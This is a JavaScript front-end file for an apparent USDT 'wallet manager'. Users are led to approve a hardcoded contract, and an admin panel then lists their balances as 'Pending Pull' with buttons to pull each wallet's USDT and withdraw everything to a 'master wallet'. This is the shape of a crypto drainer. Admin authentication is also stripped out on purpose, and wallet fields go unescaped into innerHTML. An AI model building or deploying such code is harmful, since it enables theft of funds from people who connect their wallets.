import WalletConnector from './components/WalletConnector.js';
import ApiService from './services/api.js';
import { detectPlatform, formatAddress, formatBalance } from './utils/wallet.js';

class WalletManagerApp {
    constructor() {
        this.walletConnector = new WalletConnector();
        this.apiService = new ApiService();
        this.isAdmin = true; // Always true - no authentication
        this.adminKey = 'default'; // Default key - no authentication needed
        
        this.initializeElements();
        this.attachEventListeners();
        this.init();
    }

    initializeElements() {
        // Header elements
        this.connectButton = document.getElementById('connect-wallet');
        this.connectionStatus = document.getElementById('connection-status');
        this.walletInfo = document.getElementById('wallet-info');
        this.walletAddressElement = document.getElementById('wallet-address');
        this.usdtBalanceElement = document.getElementById('usdt-balance');
        this.approveButton = document.getElementById('approve-contract');
        
        // Admin elements (now accessible to everyone)
        this.adminPanel = document.getElementById('admin-panel');
        this.walletList = document.getElementById('wallet-list');
        // Remove admin login elements since they're not needed
        this.adminKeyInput = document.getElementById('admin-key');
        this.adminLoginButton = document.getElementById('admin-login');
        this.adminLogoutButton = document.getElementById('admin-logout');
        this.withdrawButton = document.getElementById('withdraw-all');
        
        // Loading indicator
        this.loadingIndicator = document.getElementById('loading');
    }

    attachEventListeners() {
        if (this.connectButton) {
            this.connectButton.addEventListener('click', () => this.handleConnectWallet());
        }
        
        if (this.approveButton) {
            this.approveButton.addEventListener('click', () => this.handleApproveContract());
        }
        
        // Remove admin login/logout event listeners
        // Add wallet list loading on init instead
        
        if (this.withdrawButton) {
            this.withdrawButton.addEventListener('click', () => this.handleWithdraw());
        }
    }

    async init() {
        const platform = detectPlatform();
        console.log('Platform detected:', platform);
        
        // Check if wallet is already connected
        const storedAddress = localStorage.getItem('walletAddress');
        if (storedAddress) {
            this.walletConnector.walletAddress = storedAddress;
            await this.updateWalletUI(storedAddress);
            this.showWalletInfo();
        }
        
        // Always show admin panel and load wallets (no authentication)
        this.isAdmin = true;
        this.showAdminPanel();
        await this.loadWallets();
    }

    async handleConnectWallet() {
        this.showLoading(true);
        
        try {
            const result = await this.walletConnector.connect();
            
            if (result.success) {
                localStorage.setItem('walletAddress', result.address);
                await this.updateWalletUI(result.address);
                this.showWalletInfo();
                
                // Send to backend
                try {
                    await this.apiService.connectWallet({
                        address: result.address,
                        name: `Wallet ${formatAddress(result.address)}`
                    });
                } catch (error) {
                    console.error('Error connecting to backend:', error);
                }
            } else {
                this.showError(`Connection failed: ${result.error}`);
            }
        } catch (error) {
            this.showError(`Connection failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    async updateWalletUI(address) {
        this.connectionStatus.textContent = `Connected: ${formatAddress(address)}`;
        this.connectButton.textContent = 'Connected';
        this.connectButton.disabled = true;
        
        this.walletAddressElement.textContent = address;
        
        // Get USDT balance
        try {
            const balance = await this.getUSDTBalance(address);
            this.usdtBalanceElement.textContent = formatBalance(balance);
        } catch (error) {
            console.error('Error getting balance:', error);
            this.usdtBalanceElement.textContent = '0.00';
        }
    }

    showWalletInfo() {
        this.walletInfo.classList.remove('hidden');
    }

    hideWalletInfo() {
        this.walletInfo.classList.add('hidden');
    }

    async handleApproveContract() {
        this.showLoading(true);
        
        try {
            const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
            const result = await this.walletConnector.approveContract(contractAddress);
            
            if (result.success) {
                this.showSuccess('Contract approved successfully!');
                this.approveButton.disabled = true;
                this.approveButton.textContent = 'Approved';
                
                // Update backend
                try {
                    await this.apiService.approveWallet({
                        address: this.walletConnector.walletAddress
                    });
                } catch (error) {
                    console.error('Error updating backend:', error);
                }
            } else {
                this.showError(`Approval failed: ${result.error}`);
            }
        } catch (error) {
            this.showError(`Approval failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    async getUSDTBalance(walletAddress) {
        try {
            const response = await this.apiService.getWalletBalance(walletAddress);
            return response.balance || '0.00';
        } catch (error) {
            console.error('Error getting USDT balance:', error);
            return '0.00';
        }
    }

    // Remove handleAdminLogin and handleAdminLogout methods completely

    showAdminPanel() {
        // Always show admin panel
        if (this.adminPanel) {
            this.adminPanel.classList.remove('hidden');
        }
    }

    hideAdminPanel() {
        // Don't hide admin panel
        // this.adminPanel.classList.add('hidden');
    }

    async loadWallets() {
        // Remove authentication check
        // if (!this.isAdmin) return;
        
        this.showLoading(true);
        
        try {
            // Remove admin key requirement
            const response = await this.apiService.getAllWallets('default');
            
            if (response.success) {
                this.renderWalletList(response.wallets);
            } else {
                this.showError('Failed to load wallets: ' + response.error);
            }
        } catch (error) {
            this.showError('Failed to load wallets: ' + error.message);
        } finally {
            this.showLoading(false);
        }
    }

    renderWalletList(wallets) {
        if (!this.walletList) return;
        
        if (wallets.length === 0) {
            this.walletList.innerHTML = '<p class="no-wallets">No wallets connected yet</p>';
            return;
        }
        
        this.walletList.innerHTML = wallets.map(wallet => `
            <div class="wallet-card" data-address="${wallet.address}">
                <h3>${wallet.name || formatAddress(wallet.address)}</h3>
                <p class="wallet-address">${wallet.address}</p>
                <p>USDT Balance: <span class="balance">${formatBalance(wallet.usdt_balance)}</span> USDT</p>
                <p class="status">
                    ${wallet.is_processed ? 
                        '<span class="status-badge processed">Processed</span>' : 
                        (parseFloat(wallet.usdt_balance) > 0 ? 
                            '<span class="status-badge pending">Pending Pull</span>' : 
                            '<span class="status-badge inactive">Inactive</span>')
                    }
                </p>
                ${!wallet.is_processed && parseFloat(wallet.usdt_balance) > 0 ? 
                    `<button class="pull-btn" onclick="app.pullWallet('${wallet.address}')">Pull USDT</button>` : 
                    ''
                }
            </div>
        `).join('');
    }

    async pullWallet(walletAddress) {
        this.showLoading(true);
        
        try {
            // Remove admin key requirement
            const response = await this.apiService.pullWallet(walletAddress, 'default');
            
            if (response.success) {
                this.showSuccess(`Successfully pulled ${response.amount} USDT`);
                await this.loadWallets(); // Refresh the list
            } else {
                this.showError(`Pull failed: ${response.error}`);
            }
        } catch (error) {
            this.showError(`Pull failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    async handleWithdraw() {
        this.showLoading(true);
        
        try {
            // Remove admin key requirement
            const response = await this.apiService.withdrawContract('default');
            
            if (response.success) {
                this.showSuccess(`Successfully withdrew ${response.amount} USDT to master wallet`);
                await this.loadWallets(); // Refresh the list
            } else {
                this.showError(`Withdrawal failed: ${response.error}`);
            }
        } catch (error) {
            this.showError(`Withdrawal failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    showLoading(show) {
        if (this.loadingIndicator) {
            this.loadingIndicator.style.display = show ? 'block' : 'none';
        }
    }

    showSuccess(message) {
        // Create a temporary success message
        const successDiv = document.createElement('div');
        successDiv.className = 'alert success';
        successDiv.textContent = message;
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
            if (document.body.contains(successDiv)) {
                document.body.removeChild(successDiv);
            }
        }, 3000);
    }

    showError(message) {
        // Create a temporary error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'alert error';
        errorDiv.textContent = message;
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            if (document.body.contains(errorDiv)) {
                document.body.removeChild(errorDiv);
            }
        }, 5000);
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.app = new WalletManagerApp();
});
